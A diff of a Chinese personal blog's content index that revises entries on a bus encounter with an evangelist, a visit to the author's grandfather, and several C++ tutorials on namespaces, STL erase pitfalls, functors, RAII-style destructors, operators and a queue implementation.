         <content type="html"> 今天在回家的车上，遇到一个上帝的信徒，在宣传上帝的故事，对着一个高中生大讲特讲信上帝不是一种迷信。举了很多的例子，比如人们熟知的爱因斯坦，牛顿等是上帝的忠实信徒，一边搞学问一边翻圣经，学问做不去了，就去问圣经。也讲宇宙是什么，是上帝创造了宇宙万物，人类就是大海中一粒沙一样存在整个宇宙之中，人类是渺小的。无论人类科技多么的发展，也不能在其它星球上创造生物。最后在快下车的时候，给每人发一张卡片，劝说人们多去教堂感受一下。身体只是一个灵魂的载体，每个灵魂需要远离罪恶，前往永远与罪恶无关的福乐美地。
-她所说的前大部分都是废话，最一后说灵魂远离罪恶才是基督的精髓。无论上帝是否存在其实都不重要，或许在人类达到不到地方，就是上帝存在的地方。这个上帝不是一个神，还是人类敬畏的未知领域。在这个物欲横流的糟糕社会，在一堆诱惑的面前，人们的灵魂又有几个能真正地远离罪恶，教堂成了人们忏悔的地方，宗教是一种精神的寄托。有时人有种寄托其实也很幸福的。
+她所说的前大部分都是废话，最一后说灵魂远离罪恶才是基督的精髓。无论上帝是否存在其实都不重要，或许在人类达到不到地方，就是上帝存在的地方。这个上帝不是一个神，而是人类敬畏的未知领域。在这个物欲横流的糟糕社会，在一堆诱惑的面前，人们的灵魂又有几个能真正地远离罪恶，教堂成了人们忏悔的地方，宗教是一种精神的寄托。有时人有种寄托其实也很幸福的。
 </content>
     </entry>
     
@@ -4272,7 +4284,7 @@ void setBoolean (Field f, Object a, final boolean value) { ／／插入检查obj
         <tags>
           <tag>家庭</tag>
         </tags>
-        <content type="html"> 昨天我去一了趟广州小叔那，去看我爷爷。岁月催人老，一晃我爷爷马上80岁了。我差不多每一年才与他见面一次，主要是回家过年时。每次见到他，都感觉他越来越苍老，不过今年他的身体还不错，希望他能健康百岁。
+        <content type="html"> 昨天我去一了趟广州小叔那，看我爷爷。岁月催人老，一晃我爷爷马上80岁了。我差不多每一年才与他见面一次，主要是回家过年时。每次见到他，都感觉他越来越苍老，不过今年他的身体还不错，希望他能健康百岁。
 老人真像小孩一样，有时也会拿我开涮一下，他说他与奶奶在一起有60年了，正好有一花甲了。他说这一次要在广州多呆一段时间，要看广州这边国庆热闹。国庆之后，一定要坐飞机回去，说一辈了还没有坐过飞机，总爱喜欢问一些关于飞机上的事，我只得一一回答。这次老人在广州呆着还是很愉快的，说广州比家里热多了，他喜欢天天呆在有空调的房子里不爱出去。他喜欢渴点酒，一天总是端一个杯子，我就劝他少渴点，也总是笑着对我说润润嘴巴。
 </content>
     </entry>
@@ -4319,30 +4331,23 @@ void setBoolean (Field f, Object a, final boolean value) { ／／插入检查obj
     </entry>
     
      <entry>
-        <title>C&#43;&#43;技巧之名字空间namespace</title>
+        <title>c&#43;&#43;技巧之名字空间namespace</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_namespace_usage/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> C开发人员会经常使用#define即宏来声明常量，但宏却是全局的，对大的工程来说是很难维护，经常是导致名字冲突。还好，C&#43;&#43;给我们带来了namespace名字空间。它的使用如下，名字空间可以把一组逻辑分组，同时名字空间也是一种作用域。
-namespace outspname { const int CVAR1 = 1; const char* const CVAR2 = &amp;#34;33333&amp;#34;; void test(); namespace inspname { enum { A, B, C}; class Klass { }; } } 但即使一个简单的名字空间，其中也有不少的玄机。
+namespace outspname { const int CVAR1 = 1; const char* const CVAR2 = &amp;#34;33333&amp;#34;; void test(); namespace inspname { enum { A, B, C}; class Klass {}; } } 但即使一个简单的名字空间，其中也有不少的玄机。
   当某个名字在自己的空间之外使用，在反复地在前面加上名字空间作为限定词， 如:
 const int local = outspname::inspname::A 这样写是不是很令人烦。在某个小的局部作用域内，我们可以通过一个使用声明。如:
 { using outspname::inspname::A; const int local = A; }   通过一个使用指令把该名字空间下所有的名字变成可用。
 如下所示，与第一点的用法区别，是using 后面有个namespace。同样只在转换时，或者在一个小的局部作用域内使用using namesapce，否则也会带来名字的污染。
 { using namespace outspname; const int local2 = CVAR1; const int local2 = inspname::B; { using namespace inspname; Klass* p = new Klass(); } } 但使用using namespace这种用法时，要注意下面一点，如在某个.h中声明了有testname::test的方法。
-namespace testname { void test(int param); } 在其.cpp中，不能使用如下这种方式，test方法只是此编译单元的一个局部方法，并非testname名字空间的test方法实现。
-using testname; void test(int param) { } 正确的使用方式是:
-namespace testname { void test(int param) { } } 或者是
-void testname::test(int param) { }   名字空间的别名，当名字空间很长或嵌套很深时，我们可以使用名字空间别名，用法如下：
-namespace oin = outspname::inspname;   无名名字空间，无名名字空间主要是保持代码的局部性，使用如下：
-namespace { const int CVAR1 = 1; void test(); } 但一定要注意的一点是，在C&#43;&#43;编译器实现时，无名名字空间其实是有名字的，这个隐含的名字跟它所在编译单元名字相关。所以基于这一点，我们不能跨编译单元使用无名名字空间中的名字。上面的声明等价于:
-namespace $$$ { const int CVAR1 = 1; void test(); } using namespace $$$; 其中$$$在其所在的作用域里具有惟一性的名字，每个编译单元里的无名名字空间也是互不相同的，usingnamesapce $$$只是当前的编译单元的隐含名字，所以不能跨编译单元使用无名名字空间中的名字。假设上面的test方法在是a.h与a.cpp中定义与实现的，但在b.h或b.cpp中就不能直接使用test方法或CVAR1。因为在b的这个编译单元中链接的是b这个编译单元中的test符号，并非a编译单元中的test符号，也就会出现未定符号。
-  要避免名字空间使用很短的名字，也不能太长，更不能嵌套太深了，个人觉得不要超过4层。
- </content>
+namespace testname { void test(int param); }   在其.cpp中，不能使用如下这种方式，test方法只是此编译单元的一个局部方法，并非testname名字空间的test方法实现。 using testname; void test(int param) { }
+正确的使用方式是:  namespace testname { void test(int param) { } } ``` 或者是 ``` void testname::test(int param) { } ``` * 名字空间的别名，当名字空间很长或嵌套很深时，我们可以使用名字空间别名，用法如下： ``` namespace oin = outspname::inspname; ``` * 无名名字空间，无名名字空间主要是保持代码的局部性，使用如下： ``` namespace { const int CVAR1 = 1; void test(); } ``` 但一定要注意的一点是，在C&#43;&#43;编译器实现时，无名名字空间其实是有名字的，这个隐含的名字跟它所在编译单元名字相关。所以基于这一点，我们不能跨编译单元使用无名名字空间中的名字。上面的声明等价于: namespace $$$ { const int CVAR1 = 1; void test(); } using namespace $$$; ``` 其中`$$$`在其所在的作用域里具有惟一性的名字，每个编译单元里的无名名字空间也是互不相同的，`usingnamesapce $$$`只是当前的编译单元的隐含名字，所以不能跨编译单元使用无名名字空间中的名字。假设上面的test方法在是a.h与a.cpp中定义与实现的，但在b.h或b.cpp中就不能直接使用test方法或CVAR1。因为在b的这个编译单元中链接的是b这个编译单元中的test符号，并非a编译单元中的test符号，也就会出现未定符号。   要避免名字空间使用很短的名字，也不能太长，更不能嵌套太深了，个人觉得不要超过4层。 </content>
     </entry>
     
      <entry>
@@ -4354,13 +4359,13 @@ namespace $$$ { const int CVAR1 = 1; void test(); } using namespace $$$; 其中$
         <tags>
           <tag>软件设计</tag>
         </tags>
-        <content type="html"> 如何同时提高一个软件系统的可维护性和可复用性是面向对象的设计要解决的核心问题。
+        <content type="html"> 为什么要有设计 如何同时提高一个软件系统的可维护性和可复用性是面向对象的设计要解决的核心问题。
 导致一个软件设计的可维护性较低，也就是说会随着性能要求的变化而“腐烂”的真正原因有四个：
  过于僵硬 过于脆弱 复用率低 黏度过高  一个好的系统设计应该有如下的性质，这三条性质就是一个系统设计应当达到的目标。
  可扩展性 灵活性 可插入性  软件的复用的好处有：
  较高的生产效率 较高的软件质量 恰当使用复用可改善系统的可维护性  在面向对象的语言中，数据的抽象化、继承、封装和多态性是几项最重要的语言特性，这些特性使得一个系统可以在更高的层次上提供可复用性。数据的抽象化和继承关系使得概念和定义可以复用；多态性使得实现和应用可以复用；而抽象化和封装可以保持和促进系统的可维护性。
 在一个设计得当的系统中，每一个模块都相对于其它模块独立存在，并只保持与其它模块的尽可能少的通信。这样一来，在其中某一个模块发生代码修改的时候，这个修改的压力不会传递到其它的模块。
-常见的设计原则有：
+设计原则 常见的设计原则有：
   “开闭”原则（Open-Closed Principle）
 “开闭”原则讲的是：一个软件实体应当对扩展开放，对修改关闭。其英文原文是：Software entities should be open for extension,but closed for modification.满足开闭原则的设计可以给一个软件系统两个无可比拟的优越性：1.通过扩展已有的软件系统，可以提供新的行为，以满足对软件的新需求，使变化中的软件系统有一定的适应性和灵活必。2.已有的软件模块，特别是最重要的抽象层模块不能再修改，这就使变化中的软件系统有一定的稳定性和延续性。
   里氏代换原则（Liskov Substitution Principle）
@@ -4378,19 +4383,19 @@ namespace $$$ { const int CVAR1 = 1; void test(); } using namespace $$$; 其中$
     </entry>
     
      <entry>
-        <title>[C&#43;&#43;] STL容器中erase方法的不同陷阱</title>
+        <title>c&#43;&#43; STL容器erase方法的不同陷阱</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_erase_fault/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
-        <content type="html"> STL中的容器都有erase方法，容器的存储分为顺序存储(如vector)与链式存储(如list,map)。先以map为例:
+        <content type="html"> 陷阱 STL中的容器都有erase方法，容器的存储分为顺序存储(如vector)与链式存储(如list,map)。先以map为例:
 typedef std::map&amp;lt;std::string, std::string&amp;gt; TStrMap; typedef TStrMap::iterator TStrMapIter; TStrMap strmap; TStrMapIter iter = strmap.find(&amp;#34;somekey&amp;#34;); strmap.erase(iter); 这样使用erase方法没有任何问题，删除一个单结节之后，stl中的iterator都是与其中的数据元素关联的，关联的元素删除之后，iter已就失效，iter理解为指向元素的指针，那删除之后可以简单理解为已是一个野指针。
 但有时我们一不注意，却会这样使用，这是错误的:
 for(TStrMapIter iter= strmap.begin(); iter!= strmap.end();&#43;&#43;iter) { if (&amp;#34;somevalue&amp;#34; == iter-&amp;gt;second ) { strmap.erase(iter); } } iter所指的元素删除之后，&#43;&#43;iter是错误的，会导致程序的未知结果，iter一般是不会移到指向下一个元素。
-对于map与list这样的链式存储结构。我们一般可以有两种解决办法:
+解决办法 对于map与list这样的链式存储结构。我们一般可以有两种解决办法:
 方法一 使用erase(iter&#43;&#43;)，因为iter2 = iter&#43;&#43;是iter先移到指向下一个节点，而iter2还是指向当前的节点。注意理解iter&#43;&#43;与&#43;&#43;iter的区别。
 for(TStrMapIter iter= strmap.begin(); iter!= strmap.end();) { if (&amp;#34;somevalue&amp;#34; == iter-&amp;gt;second ) { strmap.erase(iter&#43;&#43;); } else { &#43;&#43;iter; } } 方法二 erase的返回值会指向下一个节点，记把下一节点赋给一个变量。
 for(TStrMapIter iter= strmap.begin(); iter!= strmap.end();) { if (&amp;#34;somevalue&amp;#34; == iter-&amp;gt;second ) { iter = strmap.erase(iter); } else { &#43;&#43;iter; } } 但对于顺序存储的vector也可以使用上述两种方法吗？很遗憾，第一种用法却是错误的，但第二种用法是正确的。因为顺序存储的容器一旦erase时，会涉及到数据移动，iterator所指的位置还是那个位置，但元素却移动了，iter&#43;&#43;之后已不再你想要的元素位置了。
@@ -4399,54 +4404,55 @@ void test_vector_erase() { typedef std::vector&amp;lt;int&amp;gt; TIntVec; typed
     </entry>
     
      <entry>
-        <title>C&#43;&#43;的仿函数与动态语言的闭包</title>
+        <title>c&#43;&#43;的仿函数与动态语言的闭包</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_closure_pkg/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
-        <content type="html"> 什么是闭包，我们先来用ruby看个例子：
+        <content type="html"> 闭包 什么是闭包，我们先来用ruby看个例子：
 sum = 0 10.times{|n| sum &#43;= n} print sum 其中{}就是闭包的内容，代码看起来是不是很清爽与简单。
-我们还来看看Python写的闭包：
+我们再来看看Python写的闭包：
 def addx(x): return lambda y: x &#43; y add8 = addx(8) print add8(100) 用Python写就没有那么好看。
 闭包（Closure）是词法闭包（Lexical Closure）的简称。对闭包的具体定义有很多种说法，这些说法大体可以分为两类：
  一种说法认为闭包是符合一定条件的函数，闭包是在其词法上下文中引用了自由变量的函数。 另一种说法认为闭包是由函数和与其相关的引用环境组合而成的实体。比如参考资源中就有这样的的定义：在实现深约束时，需要创建一个能显式表示引用环境的东西，并将它与相关的子程序捆绑在一起，这样捆绑起来的整体被称为闭包。  这两种定义在某种意义上是对立的，一个认为闭包是函数，另一个认为闭包是函数和引用环境组成的整体。虽然有些咬文嚼字，但可以肯定第二种说法更确切。闭包只是在形式和表现上像函数，但实际上不是函数。函数是一些可执行的代码，这些代码在函数被定义后就确定了，不会在执行时发生变化，所以一个函数只有一个实例。闭包在运行时可以有多个实例，不同的引用环境和相同的函数组合可以产生不同的实例。所谓引用环境是指在程序执行中的某个点所有处于活跃状态的约束所组成的集合。其中的约束是指一个变量的名字和其所代表的对象之间的联系。那么为什么要把引用环境与函数组合起来呢？这主要是因为在支持嵌套作用域的语言中，有时不能简单直接地确定函数的引用环境。
-什么是仿函数，我们先用C&#43;&#43;来写个例子：
+仿函数 什么是仿函数，我们先用C&#43;&#43;来写个例子：
 struct comparer { bool operator()(int a, int b) const { return a &amp;gt; b; } }; int main(int, char**) { std::vector&amp;lt;int&amp;gt; vec; std::sort(vec.begin(), vec.end(), comparer()); return 0; } 函数(functor)之所以称为仿函数，是因为这是一种利用某些类对象支持operator()的特性，来达到模拟函数调用效果的技术。从上面你也可以看出来，仿函数实现的内容其实就像动态语言闭包实现的方式差不多，形式不一样，效果是一样的。至于语言本质是什么，就让语言学家去争论吧。
 </content>
     </entry>
     
      <entry>
-        <title>C&#43;&#43;技巧之栈变量的析构应用</title>
+        <title>c&#43;&#43;技巧之栈变量的析构应用</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_stack_usage/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
-        <content type="html"> 栈变量有一个好处，就是它退栈时会自动析构，并且在栈上对象生成比在堆上分配效率高很多。但每个线程的栈空间是有限的(创建线程时可以设置)，所以一般的临时小对象都会在栈上分配。
-struct Test {}; void test() { Test stack_var; // a stack var; Test stack_var2; //a stack var; int *heap_var = new int; // a heap var } 上述的例子，stack_var与stack_var2都是一个栈变量，当然stack_var与stack_var2谁先从栈中分配，不的操作系统，内存管理方式也略有区别。更深一点讲，heap_var这个指针值也是一个栈变量承载，但heap_var所指的地址内容才是从堆上分配的内存空间。当退出test这个函数时，stack_var与stack_var2都会先调用Test的析构，再把其所在的内存空间回收到线程栈中。
-在一些场景下，我们可以利用栈变量当退栈时会自动析构这特性，下面我将举两个应用例子。
+        <content type="html"> 栈变量 栈变量有一个好处，就是它退栈时会自动析构，并且在栈上对象生成比在堆上分配效率高很多。但每个线程的栈空间是有限的(创建线程时可以设置)，所以一般的临时小对象都会在栈上分配。
+struct Test {}; void test() { Test stack_var; // a stack var;  Test stack_var2; //a stack var;  int *heap_var = new int; // a heap var } 上述的例子，stack_var与stack_var2都是一个栈变量，当然stack_var与stack_var2谁先从栈中分配，不的操作系统，内存管理方式也略有区别。更深一点讲，heap_var这个指针值也是一个栈变量承载，但heap_var所指的地址内容才是从堆上分配的内存空间。
+当退出test这个函数时，stack_var与stack_var2都会先调用Test的析构，再把其所在的内存空间回收到线程栈中。
+应用 在一些场景下，我们可以利用栈变量当退栈时会自动析构这特性，下面我将举两个应用例子。
 析构方法释放内存 从堆上面new出来的对象，在一个方法条件分支比较多的情况下，很容易在某个分支少写delete，就会造成内存的泄漏。于是我们可写一个这样的类，在它的析构方法中调用delete回收内存。
-template &amp;lt;typename T&amp;gt; class ScopePtr { public: ScopePtr(T *&amp;amp; pT) : m_pT(pT) { } ~ScopePtr() { if ( NULL != m_pT ) { delete m_pT; m_pT = NULL; } } private: typedef ScopePtr&amp;lt;T&amp;gt; TScopePtr; ScopePtr(const TScopePtr &amp;amp;) {} TScopePtr&amp;amp; operator = (const TScopePtr &amp;amp;) {} T *&amp;amp; m_pT; }; // 使用方式如下： void test_scope() { Test* p = new Test; ScopePtr&amp;lt;Test&amp;gt; tempScopePtr(p); } 析构方法打印日志 做软件，写debug日志是一个好的习惯，出问题时可以方便定位问题的发生源。下面的例子是实现是能记录函数在哪一行进入，在哪一行退出。如果函数某个地方抛异常了，则可以根据进入行与退出行相同一看便知。没有抛异常，也很方便查出是在哪个分支退出的。
-#define LOG(fmt, ...) printf(fmt, __VA_ARGS__) #define __FUNC_TRACE__ class FuncTracer { public: FuncTracer(const char* func, const char* file, const int line) : m_func(func), m_file(file), m_line(line) { LOG(&amp;#34;Enter [%s][%d][%s]./n&amp;#34;, m_file, m_line, m_func); } ~FuncTracer() { LOG(&amp;#34;Exit [%s][%d][%s]./n&amp;#34;, m_file, m_line, m_func); } inline void updateLine(const int line) { m_line = line; } private: const char* m_func; const char* m_file; int m_line; }; #ifdef __FUNC_TRACE__ #define FUNC_TRACER() FuncTracer __oFuncTracer(__FUNCTION__, __FILE__, __LINE__) #define FUNC_RET(retVal) do { __oFuncTracer.updateLine(__LINE__); return retVal; } while(0) #define FUNC_RET_VOID() do { __oFuncTracer.updateLine(__LINE__); return; } while(0) #else #define FUNC_TRACER() #define FUNC_RET(retVal) return retVal; #define FUNC_RET_VOID() return; #endif 上述的__FUNCTION__，__FILE__与__LINE__是编译期间的宏，是一个字符串常量，分别表示函数名，文件名与当前行数。但__FUNCTION__并非标准中定义的，各个编译器命名不同，更通用的宏可以使用boost中BOOST_CURRENT_FUNCTION。其中的__FUNC_TRACE__宏开关表示是否编译时开启函数跟踪。使用方式如下：
+template &amp;lt;typename T&amp;gt; class ScopePtr{ public: ScopePtr(T *&amp;amp; pT) : m_pT(pT) { } ~ScopePtr() { if ( NULL != m_pT ) { delete m_pT; m_pT = NULL; } } private: typedef ScopePtr&amp;lt;T&amp;gt; TScopePtr; ScopePtr(const TScopePtr &amp;amp;) {} TScopePtr&amp;amp; operator = (const TScopePtr &amp;amp;) {} T *&amp;amp; m_pT; }; // 使用方式如下： void test_scope() { Test* p = new Test; ScopePtr&amp;lt;Test&amp;gt; tempScopePtr(p); } 析构方法打印日志 做软件，写debug日志是一个好的习惯，出问题时可以方便定位问题的发生源。下面的例子是实现是能记录函数在哪一行进入，在哪一行退出。如果函数某个地方抛异常了，则可以根据进入行与退出行相同一看便知。没有抛异常，也很方便查出是在哪个分支退出的。
+#define LOG(fmt, ...) printf(fmt, __VA_ARGS__) #define __FUNC_TRACE__  class FuncTracer{ public: FuncTracer(const char* func, const char* file, const int line) : m_func(func), m_file(file), m_line(line) { LOG(&amp;#34;Enter [%s][%d][%s]./n&amp;#34;, m_file, m_line, m_func); } ~FuncTracer() { LOG(&amp;#34;Exit [%s][%d][%s]./n&amp;#34;, m_file, m_line, m_func); } inline void updateLine(const int line) { m_line = line; } private: const char* m_func; const char* m_file; int m_line; }; #ifdef __FUNC_TRACE__  #define FUNC_TRACER() FuncTracer __oFuncTracer(__FUNCTION__, __FILE__, __LINE__)  #define FUNC_RET(retVal) do { __oFuncTracer.updateLine(__LINE__); return retVal; } while(0)  #define FUNC_RET_VOID() do { __oFuncTracer.updateLine(__LINE__); return; } while(0) #else  #define FUNC_TRACER()  #define FUNC_RET(retVal) return retVal;  #define FUNC_RET_VOID() return; #endif 上述的__FUNCTION__，__FILE__与__LINE__是编译期间的宏，是一个字符串常量，分别表示函数名，文件名与当前行数。但__FUNCTION__并非标准中定义的，各个编译器命名不同，更通用的宏可以使用boost中BOOST_CURRENT_FUNCTION。其中的__FUNC_TRACE__宏开关表示是否编译时开启函数跟踪。使用方式如下：
 int test_trace() { FUNC_TRACER(); if(...) { switch(...) case 1: FUNC_RET(1); defualt: FUNC_RET(0); .... } FUNC_RET(1); } </content>
     </entry>
     
      <entry>
-        <title>C&#43;&#43;技巧之operator操作符</title>
+        <title>c&#43;&#43;技巧之operator操作符</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_operator/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
-        <content type="html"> 这篇博文是以前很久写的，贴在我的早期一个blog中，今天google一下，发现还真有不少人转载，可惜并不注明出处。那时觉得operator比较好玩。C&#43;&#43;有时它的确是个耐玩的东东。operator它有两种用法，一种是operator overloading（操作符重载），一种是operator casting（操作隐式转换）。
-operator overloading C&#43;&#43;可以通过operator 重载操作符，格式如下：类型T operator 操作符 ()，如比重载&#43;，如下所示
+        <content type="html"> 背景 这篇博文是以前很久写的，贴在我的早期一个blog中，今天google一下，发现还真有不少人转载，可惜并不注明出处。那时觉得operator比较好玩。C&#43;&#43;有时它的确是个耐玩的东东。operator它有两种用法，一种是operator overloading（操作符重载），一种是operator casting（操作隐式转换）。
+两种用法 operator overloading C&#43;&#43;可以通过operator 重载操作符，格式如下：类型T operator 操作符 ()，如比重载&#43;，如下所示
 template&amp;lt;typename T&amp;gt; class A { public: const T operator &#43; (const T&amp;amp; rhs) { return this-&amp;gt;m_ &#43; rhs; } private: T m_; }; 又比如STL中的函数对象，重载()，这是C&#43;&#43;中较推荐的写法，功能与函数指针类似，如下所示
 template&amp;lt;typename T&amp;gt; struct A { T operator()(const T&amp;amp; lhs, const T&amp;amp; rhs){ return lhs-rhs;} }; operator casting C&#43;&#43;可以通过operator 重载隐式转换，格式如下： operator 类型T ()，如下所示
 class A { public: operator B* () { return this-&amp;gt;b_;} operator const B* () const {return this-&amp;gt;b_;} operator B&amp;amp; () { return *this-&amp;gt;b_;} operator const B&amp;amp; () const {return *this-&amp;gt;b_;} private: B* b_; }; A a;当if(a)，编译时转换成if(a.operator B*())，其实也就是判断if(a.b_).
@@ -4454,33 +4460,33 @@ class A { public: operator B* () { return this-&amp;gt;b_;} operator const B* ()
     </entry>
     
      <entry>
-        <title>[c&#43;&#43;]自己实现的queue</title>
+        <title>c&#43;&#43;实现的queue</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_self_impl_queue/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 周末在家，自己用C&#43;&#43;练一下手，用顺序存储与链表存储实现了队列queue。queue是一种先进先出的结构，有很多的应用，比如消息队列。
-顺序存储实现： template&amp;lt;typename T, size_t SIZE&amp;gt; class Queue { public: Queue() : m_front(0), m_rear(0) { } ~Queue() { } void clear() { m_front = 0; m_rear = 0; } const bool empty() const { return m_front == m_rear; } const int size() const { int s = (m_rear - m_front &#43; (int)SIZE) % (int)SIZE ; return s; } bool push(const T&amp;amp; t) { int pos = (m_rear &#43; 1) % (int)SIZE; //printf(&amp;#34;/n m_rear = %d&amp;#34;, pos); if (pos == m_front) { return false;// it&amp;#39;s full } m_rear = pos; m_data[m_rear] = t; return true; } T&amp;amp; pop() { if (empty()) { throw Error&amp;lt;T&amp;gt;(&amp;#34;Overflow&amp;#34;); } m_front = (m_front &#43; 1) % (int)SIZE; //printf(&amp;#34;/n m_front = %d&amp;#34;, m_front); return m_data[m_front]; } T&amp;amp; getfront() { return m_data[m_front]; } // 遍历所有的节点 void traverse( void (*func)(T&amp;amp;) ) { if ( empty() ) { return;} for (int idx = m_front &#43; 1; idx != m_rear &#43; 1; idx&#43;&#43;) { if ( idx == (int)SIZE) { idx %= (int)SIZE; } //printf(&amp;#34;/n idx = %d&amp;#34;, idx); func(m_data[idx]); } } private: T m_data[SIZE]; int m_front; int m_rear; }; 链表存储实现： template&amp;lt;typename T&amp;gt; struct QNode { QNode() : m_pNext(NULL) { } T m_data; QNode* m_pNext; }; template&amp;lt;typename T&amp;gt; class LQueue { typedef QNode&amp;lt;T&amp;gt; TQNode; public: LQueue() { TQNode* pTemp = NULL; NEW(pTemp, TQNode() ); m_pFront = m_pRear = pTemp; m_size = 0; } ~LQueue() { clear(); DELETE(m_pFront); } void clear() { TQNode* pTemp = m_pFront-&amp;gt;m_pNext; while(NULL != pTemp ) { TQNode* pTemp2 = pTemp-&amp;gt;m_pNext; DELETE(pTemp); pTemp = pTemp2; } m_pFront-&amp;gt;m_pNext = NULL; m_size = 0; } const bool empty() const { return m_pFront == m_pRear; } const int size() const { return m_size;} bool push(const T&amp;amp; t) { TQNode* pTemp = NULL; NEW(pTemp, TQNode() ); if ( NULL == pTemp) { return false;} pTemp-&amp;gt;m_data = t; pTemp-&amp;gt;m_pNext = m_pRear-&amp;gt;m_pNext; m_pRear-&amp;gt;m_pNext = pTemp; m_pRear = pTemp; m_size&#43;&#43;; return true; } T pop() { if (empty()) { throw Error&amp;lt;T&amp;gt;(&amp;#34;Overflow&amp;#34;); } TQNode* pTemp = m_pFront-&amp;gt;m_pNext; T t = pTemp-&amp;gt;m_data; m_pFront-&amp;gt;m_pNext = pTemp-&amp;gt;m_pNext; if (NULL == m_pFront-&amp;gt;m_pNext) { m_pRear = m_pFront; } DELETE(pTemp); m_size--; return t; } T&amp;amp; getfront() { if (empty()) { throw Error&amp;lt;T&amp;gt;(&amp;#34;Overflow&amp;#34;); } TQNode* pTemp = m_pFront-&amp;gt;m_pNext; T t = pTemp-&amp;gt;m_data; return t; } // 遍历所有的节点 void traverse( void (*func)(T&amp;amp;) ) { if ( empty() ) { return;} TQNode* pTemp = m_pFront-&amp;gt;m_pNext; while(NULL != pTemp) { func(pTemp-&amp;gt;m_data); pTemp = pTemp-&amp;gt;m_pNext; } } private: TQNode* m_pFront; TQNode* m_pRear; int m_size; }; 测试代码： void print_queue(int&amp;amp; a) { printf(&amp;#34;%d/t&amp;#34;, a); } void test_queue() { LQueue&amp;lt;int&amp;gt; queue; //Queue&amp;lt;int, 4&amp;gt; queue; queue.push(1); queue.push(2); queue.push(3); queue.pop(); queue.pop(); queue.pop(); queue.push(1); queue.push(2); queue.push(3); printf(&amp;#34;/n1 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); queue.pop(); printf(&amp;#34;/n2 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); queue.push(4); printf(&amp;#34;/n3 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); queue.clear(); printf(&amp;#34;/n4 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); } </content>
+顺序存储 template&amp;lt;typename T, size_t SIZE&amp;gt; class Queue { public: Queue() : m_front(0), m_rear(0) { } ~Queue() { } void clear() { m_front = 0; m_rear = 0; } const bool empty() const { return m_front == m_rear; } const int size() const { int s = (m_rear - m_front &#43; (int)SIZE) % (int)SIZE ; return s; } bool push(const T&amp;amp; t) { int pos = (m_rear &#43; 1) % (int)SIZE; //printf(&amp;#34;/n m_rear = %d&amp;#34;, pos);  if (pos == m_front) { return false;// it&amp;#39;s full  } m_rear = pos; m_data[m_rear] = t; return true; } T&amp;amp; pop() { if (empty()) { throw Error&amp;lt;T&amp;gt;(&amp;#34;Overflow&amp;#34;); } m_front = (m_front &#43; 1) % (int)SIZE; //printf(&amp;#34;/n m_front = %d&amp;#34;, m_front);  return m_data[m_front]; } T&amp;amp; getfront() { return m_data[m_front]; } // 遍历所有的节点  void traverse( void (*func)(T&amp;amp;) ) { if ( empty() ) { return;} for (int idx = m_front &#43; 1; idx != m_rear &#43; 1; idx&#43;&#43;) { if ( idx == (int)SIZE) { idx %= (int)SIZE; } //printf(&amp;#34;/n idx = %d&amp;#34;, idx);  func(m_data[idx]); } } private: T m_data[SIZE]; int m_front; int m_rear; }; 链表存储 template&amp;lt;typename T&amp;gt; struct QNode { QNode() : m_pNext(NULL) { } T m_data; QNode* m_pNext; }; template&amp;lt;typename T&amp;gt; class LQueue { typedef QNode&amp;lt;T&amp;gt; TQNode; public: LQueue() { TQNode* pTemp = NULL; NEW(pTemp, TQNode() ); m_pFront = m_pRear = pTemp; m_size = 0; } ~LQueue() { clear(); DELETE(m_pFront); } void clear() { TQNode* pTemp = m_pFront-&amp;gt;m_pNext; while(NULL != pTemp ) { TQNode* pTemp2 = pTemp-&amp;gt;m_pNext; DELETE(pTemp); pTemp = pTemp2; } m_pFront-&amp;gt;m_pNext = NULL; m_size = 0; } const bool empty() const { return m_pFront == m_pRear; } const int size() const { return m_size;} bool push(const T&amp;amp; t) { TQNode* pTemp = NULL; NEW(pTemp, TQNode() ); if ( NULL == pTemp) { return false;} pTemp-&amp;gt;m_data = t; pTemp-&amp;gt;m_pNext = m_pRear-&amp;gt;m_pNext; m_pRear-&amp;gt;m_pNext = pTemp; m_pRear = pTemp; m_size&#43;&#43;; return true; } T pop() { if (empty()) { throw Error&amp;lt;T&amp;gt;(&amp;#34;Overflow&amp;#34;); } TQNode* pTemp = m_pFront-&amp;gt;m_pNext; T t = pTemp-&amp;gt;m_data; m_pFront-&amp;gt;m_pNext = pTemp-&amp;gt;m_pNext; if (NULL == m_pFront-&amp;gt;m_pNext) { m_pRear = m_pFront; } DELETE(pTemp); m_size--; return t; } T&amp;amp; getfront() { if (empty()) { throw Error&amp;lt;T&amp;gt;(&amp;#34;Overflow&amp;#34;); } TQNode* pTemp = m_pFront-&amp;gt;m_pNext; T t = pTemp-&amp;gt;m_data; return t; } // 遍历所有的节点  void traverse( void (*func)(T&amp;amp;) ) { if ( empty() ) { return;} TQNode* pTemp = m_pFront-&amp;gt;m_pNext; while(NULL != pTemp) { func(pTemp-&amp;gt;m_data); pTemp = pTemp-&amp;gt;m_pNext; } } private: TQNode* m_pFront; TQNode* m_pRear; int m_size; }; 测试代码 void print_queue(int&amp;amp; a) { printf(&amp;#34;%d/t&amp;#34;, a); } void test_queue() { LQueue&amp;lt;int&amp;gt; queue; //Queue&amp;lt;int, 4&amp;gt; queue;  queue.push(1); queue.push(2); 